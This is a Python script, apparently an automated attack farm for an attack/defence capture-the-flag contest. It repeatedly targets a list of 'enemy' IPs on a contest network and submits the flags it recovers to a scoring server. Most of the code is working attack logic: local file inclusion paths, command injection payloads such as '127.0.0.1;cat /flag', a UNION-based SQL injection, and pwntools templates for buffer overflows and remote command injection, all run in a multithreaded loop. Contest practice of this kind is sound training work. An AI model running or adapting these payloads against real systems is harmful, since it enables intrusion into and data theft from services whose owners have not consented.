import requests
import re
import time
import sys
import threading

# Try to import pwntools for Pwn challenges (Gracefully fail if not installed)
try:
    from pwn import remote, context
    context.log_level = 'error' # Keep terminal clean
    HAS_PWN = True
except ImportError:
    HAS_PWN = False

# ==========================================
# ⚙️ CONFIGURATION (EDIT THIS TOMORROW)
# ==========================================
TEAM_TOKEN = "YOUR_TEAM_TOKEN"
SUBMIT_URL = "http://10.10.0.1/api/submit" # Check the rules for exact URL
FLAG_REGEX = r"(ihack\{.*?\}|ihack2026\{.*?\}|ihack26\{.*?\})"

# List of enemy IPs (Get this from the scoreboard/network)
ENEMY_IPS = ["10.10.1.1", "10.10.2.1", "10.10.3.1"] 

# ==========================================
# 🏆 FLAG EXTRACTION & SUBMISSION
# ==========================================
def submit_flag(flag):
    try:
        # Standard A/D submission format (Modify if rules differ)
        r = requests.put(SUBMIT_URL, headers={"X-Team-Token": TEAM_TOKEN}, json=[flag], timeout=5)
        if r.status_code == 200:
            print(f"✅ [FLAG CAPTURED] {flag}")
        else:
            print(f"❌ [SUBMIT FAIL] {r.status_code} - {flag}")
    except Exception as e:
        print(f"⚠️ [NETWORK ERROR] {e}")

def extract_and_submit(text):
    if not text: return
    flags = re.findall(FLAG_REGEX, text)
    for flag in flags:
        submit_flag(flag)

# ==========================================
# 🌐 WEB EXPLOITS (Auto-Testing Common Vulns)
# ==========================================
def attack_web(ip, port=8080):
    base_url = f"http://{ip}:{port}"
    
    # 1. Local File Inclusion (LFI) - Highly common in A/D
    lfi_paths = ["/flag", "/flag.txt", "/app/flag", "/var/www/html/flag.php"]
    for path in lfi_paths:
        try:
            r = requests.get(f"{base_url}/index.php?file={path}", timeout=3)
            extract_and_submit(r.text)
        except: pass

    # 2. Command Injection (CMDi)
    cmdi_payloads = ["127.0.0.1;cat /flag", "127.0.0.1|cat /flag.txt", "127.0.0.1&&cat /app/flag"]
    for payload in cmdi_payloads:
        try:
            # Adjust 'ip' parameter based on the challenge source code
            r = requests.post(f"{base_url}/ping", data={"ip": payload}, timeout=3)
            extract_and_submit(r.text)
        except: pass

    # 3. Basic SQL Injection (Bypass login / extract flag)
    sqli_payload = "' UNION SELECT 1, flag, 3 FROM flags-- -"
    try:
        r = requests.get(f"{base_url}/profile?id={sqli_payload}", timeout=3)
        extract_and_submit(r.text)
    except: pass


# ==========================================
# 💥 PWN EXPLOITS (Using Pwntools)
# ==========================================
def attack_pwn(ip, port=1337):
    if not HAS_PWN:
        print("❌ Pwntools not installed. Skipping Pwn.")
        return

    try:
        # Connect to the remote service
        p = remote(ip, port)
        
        # --- INSERT YOUR REVERSED LOGIC HERE ---
        # Example 1: The binary asks for a password you reversed
        # p.recvuntil(b"Password: ")
        # p.sendline(b"my_reversed_password")
        
        # Example 2: Buffer overflow
        # payload = b"A" * 64 + p64(0xdeadbeef)
        # p.sendline(payload)
        
        # Example 3: Command injection in a menu
        # p.recvuntil(b"Choice: ")
        # p.sendline(b"1")
        # p.recvuntil(b"Enter cmd: ")
        # p.sendline(b"cat /flag")
        
        # Receive output and extract flag
        output = p.recvall(timeout=3).decode('utf-8', errors='ignore')
        extract_and_submit(output)
        p.close()
    except Exception as e:
        pass # Silently ignore timeouts to keep the farm running


# ==========================================
# 🔄 THE MAIN LOOP (Multithreaded for Speed)
# ==========================================
def process_target(ip):
    # You might need to adjust these ports based on the challenge descriptions
    attack_web(ip, port=8080) 
    attack_web(ip, port=80) 
    attack_pwn(ip, port=1337)
    attack_pwn(ip, port=9001)

if __name__ == "__main__":
    print("🚀 Starting Unified Attack Farm...")
    
    while True:
        start_time = time.time()
        threads = []
        
        # Launch a thread for each enemy IP so they attack simultaneously
        for ip in ENEMY_IPS:
            t = threading.Thread(target=process_target, args=(ip,))
            t.start()
            threads.append(t)
            
        for t in threads:
            t.join()
            
        elapsed = time.time() - start_time
        sleep_time = max(1, 60 - elapsed) # Sleep until the next 60s tick
        print(f"⏳ Tick complete. Sleeping for {int(sleep_time)} seconds...")
        time.sleep(sleep_time)